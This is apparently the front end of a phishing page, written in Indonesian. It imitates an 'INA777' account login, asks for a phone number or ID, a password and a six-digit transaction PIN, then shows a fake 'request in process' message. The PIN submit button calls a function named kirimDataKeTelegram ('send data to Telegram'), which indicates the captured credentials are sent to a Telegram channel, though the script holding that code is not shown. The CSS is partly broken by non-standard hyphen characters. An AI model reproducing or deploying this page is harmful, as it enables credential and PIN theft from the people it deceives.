<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF‑8">
<meta name="viewport" content="width=device‑width, initial‑scale=1.0">
<title>INA777‑Masuk Akun</title>
<style>
*{box‑sizing:border‑box;font‑family:Arial,sans‑serif;margin:0;padding:0;}
body{background‑image:url('https://i.imgur.com/9Z7XkLb.jpg');background‑size:cover;background‑position:center;background‑repeat:no‑repeat;display:flex;justify‑content:center;align‑items:center;min‑height:100vh;padding:10px;}
.container{width:360px;position:relative;border‑radius:22px;overflow:hidden;box‑shadow:0 10px 25px rgba(0,0,0,0.3);}
.halaman{display:none;}
.halaman.aktif{display:block;}
.header‑top{background:linear‑gradient(180deg,#7ec8ff,#40a8f5);padding:18px 22px 12px 22px;color:#fff;}
.judul‑halaman{font‑size:28px;font‑weight:bold;text‑shadow:2px 2px #0066aa;}
.close‑btn{position:absolute;top:12px;right:12px;width:46px;height:46px;border‑radius:50%;background:#66ccff;border:none;font‑size:24px;color:#003366;box‑shadow:0 3px 0 rgba(0,0,0,0.15);cursor:pointer;z‑index:10;}
.form‑box{background:#2b549c;padding:22px;}
.tab‑bar{display:flex;gap:8px;margin‑bottom:18px;}
.tab{flex:1;padding:10px;border‑radius:12px;text‑align:center;font‑weight:bold;font‑size:16px;cursor:pointer;background:#b0c4de;color:#222;}
.tab.active{background:#eef266;color:#335500;}
.note‑red{color:#ff4444;font‑size:13px;line‑height:1.5;margin‑bottom:22px;}
.form‑group{margin‑bottom:18px;}
.label{color:#fff;font‑size:15px;margin‑bottom:8px;display:block;font‑weight:bold;}
.input‑wrapper{display:flex;gap:8px;align‑items:center;}
input[type="tel"],input[type="text"],input[type="password"]{flex:1;height:46px;padding:12px 14px;border:none;border‑radius:11px;background:#1a335e;color:#fff;font‑size:16px;}
.icon‑btn{width:44px;height:46px;border‑radius:11px;border:none;background:#66ccff;color:#003366;font‑size:18px;cursor:pointer;}
.forgot‑link{color:#88ddff;font‑size:14px;margin‑top:6px;display:block;text‑decoration:underline;text‑align:right;}
.button‑row{display:flex;gap:12px;margin‑top:24px;}
.btn{flex:1;height:50px;border:none;border‑radius:14px;font‑size:18px;font‑weight:bold;cursor:pointer;box‑shadow:0 4px 0 rgba(0,0,0,0.15);}
.btn‑daftar{background:linear‑gradient(180deg,#ffdd44,#ffaa00);color:#994400;}
.btn‑login{background:linear‑gradient(180deg,#66ddff,#22aaff);color:#004477;}
.pin‑box{background:#2b549c;padding:30px 22px;text‑align:center;}
.pin‑judul{color:#fff;font‑size:22px;font‑weight:bold;margin‑bottom:16px;}
.pin‑keterangan{color:#ddd;font‑size:14px;line‑height:1.6;margin‑bottom:20px;}
.pin‑input{width:100%;height:50px;padding:12px;border:none;border‑radius:11px;background:#1a335e;color:#fff;font‑size:20px;text‑align:center;letter‑spacing:12px;margin‑bottom:20px;}
.btn‑lanjut{width:100%;height:50px;border:none;border‑radius:14px;background:linear‑gradient(180deg,#66ddff,#22aaff);color:#004477;font‑size:18px;font‑weight:bold;cursor:pointer;box‑shadow:0 4px 0 rgba(0,0,0,0.15);}
.terima‑kasih‑box{background:rgba(255,255,255,0.95);padding:40px 22px;text‑align:center;}
.terima‑kasih‑judul{font‑size:22px;font‑weight:bold;color:#2b549c;margin‑bottom:15px;}
.terima‑kasih‑teks{font‑size:15px;color:#444;line‑height:1.7;}
</style>
</head>
<body>
<div class="container">
  <button class="close‑btn">✕</button>
  <div class="halaman aktif" id="halaman‑login">
    <div class="header‑top"><div class="judul‑halaman">Akun Masuk</div></div>
    <div class="form‑box">
      <div class="tab‑bar">
        <div class="tab active" onclick="gantiTab('hp')">Nomor HP</div>
        <div class="tab" onclick="gantiTab('id')">ID</div>
      </div>
      <p class="note‑red">* Harap masukkan informasi kontak yang terikat selama otentikasi keamanan untuk masuk</p>
      <div class="form‑group">
        <label class="label" id="labelUtama">Nomor Telepon</label>
        <div class="input‑wrapper">
          <input type="tel" id="inputUtama" placeholder="Masukkan nomor telepon" onkeydown="cekInput(event,'hp')">
          <button class="icon‑btn">🖊</button>
        </div>
      </div>
      <div class="form‑group">
        <label class="label">Kata Sandi</label>
        <div class="input‑wrapper">
          <input type="password" id="kataSandi" placeholder="Masukkan Kata sandi">
          <button class="icon‑btn">👁</button>
        </div>
        <a href="#" class="forgot‑link">Lupa</a>
      </div>
      <div class="button‑row">
        <button class="btn btn‑daftar">Daftar</button>
        <button class="btn btn‑login" onclick="bukaHalaman('pin')">Login</button>
      </div>
    </div>
  </div>
  <div class="halaman" id="halaman‑pin">
    <div class="header‑top"><div class="judul‑halaman">PIN Transaksi</div></div>
    <div class="pin‑box">
      <div class="pin‑judul">Masukkan PIN Transaksi Anda</div>
      <p class="pin‑keterangan">Masukkan 6 angka PIN untuk melanjutkan permintaan</p>
      <input type="password" id="pinTransaksi" class="pin‑input" maxlength="6" placeholder="______" onkeydown="hanyaAngka(event)">
      <button class="btn‑lanjut" onclick="kirimDataKeTelegram()">Lanjut</button>
    </div>
  </div>
  <div class="halaman" id="halaman‑terima">
    <div class="header‑top"><div class="judul‑halaman">Pemberitahuan</div></div>
    <div class="terima‑kasih‑box">
      <div class="terima‑kasih‑judul">Terima Kasih</div>
      <p class="terima‑kasih‑teks">Permintaan Anda sedang dalam proses,<br>mohon ditunggu.</p>
    </div>
  </div>
</div>
<script src="./app.js"></script>
</body>
</html>
